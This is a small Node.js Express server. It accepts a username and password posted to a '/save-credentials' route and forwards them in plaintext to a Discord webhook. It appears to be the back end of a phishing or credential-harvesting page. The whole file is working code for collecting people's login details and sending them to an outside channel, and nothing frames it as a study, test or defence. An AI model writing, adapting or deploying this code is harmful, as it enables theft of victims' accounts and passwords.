const express = require('express');
const fetch = require('node-fetch');

const app = express();

// Serve static files from the "public" directory
app.use(express.static('public'));

// Parse form data
app.use(express.urlencoded({ extended: true }));

// Route to handle form submission
app.post('/save-credentials', async (req, res) => {
  const { username, password } = req.body;

  try {
    // Send the credentials to a Discord webhook
    await sendToDiscordWebhook(username, password);
    res.status(200).send('Credentials saved successfully!');
  } catch (error) {
    console.error('Error saving credentials:', error);
    res.status(500).send('Error saving credentials');
  }
});

try {
  const port = process.env.PORT || 3000;
  app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
  });
} catch (error) {
  console.error('Error starting server:', error);
  process.exit(1);
}

async function sendToDiscordWebhook(username, password) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  const data = {
    content: `New Credentials:\nUsername: ${username}\nPassword: ${password}`,
  };

  const response = await fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  });

  if (!response.ok) {
    throw new Error(`Failed to send data to Discord webhook: ${response.status}`);
  }
}